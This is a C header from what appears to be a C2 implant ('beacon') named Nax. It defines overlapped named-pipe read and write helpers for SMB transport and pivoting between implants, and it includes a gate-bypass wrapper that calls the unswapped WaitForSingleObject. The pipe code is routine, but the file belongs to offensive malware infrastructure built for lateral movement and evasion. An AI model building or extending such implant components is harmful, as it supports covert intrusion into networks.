/* beacon/include/Pipe.h
 * Shared overlapped named-pipe I/O helpers used by both the SMB transport
 * (child-side server) and the pivot manager (parent-side client).
 *
 * Both helpers are FUNC static so they land in .text$B and remain PIC-safe.
 * NAX_PIPE_CHUNK_SIZE controls the write chunk size (defined in NaxConstants.h). */

#pragma once
#include "Nax.h"

/* ========= [ NaxPipeWfso - gate-bypass WaitForSingleObject ] ========= */

FUNC static DWORD NaxPipeWfso( PNAX_INSTANCE Nax, HANDLE h, DWORD ms ) {
    typedef DWORD (WINAPI *FN_WFSO)( HANDLE, DWORD );
    FN_WFSO fn = (FN_WFSO)Nax->Kernel32.WaitForSingleObject;
    for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ ) {
        if ( Nax->GateSwaps.Entries[i].Slot == (PVOID*)&Nax->Kernel32.WaitForSingleObject ) {
            fn = (FN_WFSO)Nax->GateSwaps.Entries[i].Original;
            break;
        }
    }
    return fn( h, ms );
}

/* ========= [ NaxPipeWaitOv - timeout-aware overlapped wait ] ========= */

FUNC static BOOL NaxPipeWaitOv( PNAX_INSTANCE Nax, HANDLE hPipe, OVERLAPPED* ov, DWORD* transferred ) {
    DWORD w = NaxPipeWfso( Nax, ov->hEvent, NAX_PIPE_IO_TIMEOUT_MS );
    if ( w != WAIT_OBJECT_0 ) {
        Nax->Kernel32.CancelIo( hPipe );
        return FALSE;
    }
    return Nax->Kernel32.GetOverlappedResult( hPipe, ov, transferred, FALSE );
}

/* ========= [ NaxPipeWrite - write length-prefixed message in chunks ] ========= */

FUNC static BOOL NaxPipeWrite( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, const PBYTE data, UINT32 size ) {
    OVERLAPPED ov;
    MmZero( &ov, sizeof( ov ) );
    ov.hEvent = hEvent;
    DWORD written = 0;

    Nax->Kernel32.ResetEvent( hEvent );
    if ( ! Nax->Kernel32.WriteFile( hPipe, &size, 4, &written, &ov ) ) {
        if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
            if ( ! NaxPipeWaitOv( Nax, hPipe, &ov, &written ) )
                return FALSE;
        } else
            return FALSE;
    }

    UINT32 idx = 0;
    while ( idx < size ) {
        UINT32 chunk = ( size - idx > NAX_PIPE_CHUNK_SIZE ) ? NAX_PIPE_CHUNK_SIZE : ( size - idx );
        MmZero( &ov, sizeof( ov ) );
        ov.hEvent = hEvent;
        written   = 0;
        Nax->Kernel32.ResetEvent( hEvent );
        if ( ! Nax->Kernel32.WriteFile( hPipe, data + idx, chunk, &written, &ov ) ) {
            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
                if ( ! NaxPipeWaitOv( Nax, hPipe, &ov, &written ) )
                    return FALSE;
            } else
                return FALSE;
        }
        idx += written;
    }
    return TRUE;
}

/* ========= [ NaxPipeRead - read exact byte count in chunks ] ========= */

FUNC static BOOL NaxPipeRead( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, PBYTE buf, UINT32 size ) {
    UINT32 idx = 0;
    while ( idx < size ) {
        OVERLAPPED ov;
        MmZero( &ov, sizeof( ov ) );
        ov.hEvent = hEvent;
        DWORD nRead = 0;
        Nax->Kernel32.ResetEvent( hEvent );
        if ( ! Nax->Kernel32.ReadFile( hPipe, buf + idx, size - idx, &nRead, &ov ) ) {
            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
                if ( ! NaxPipeWaitOv( Nax, hPipe, &ov, &nRead ) )
                    return FALSE;
            } else
                return FALSE;
        }
        idx += nRead;
    }
    return TRUE;
}
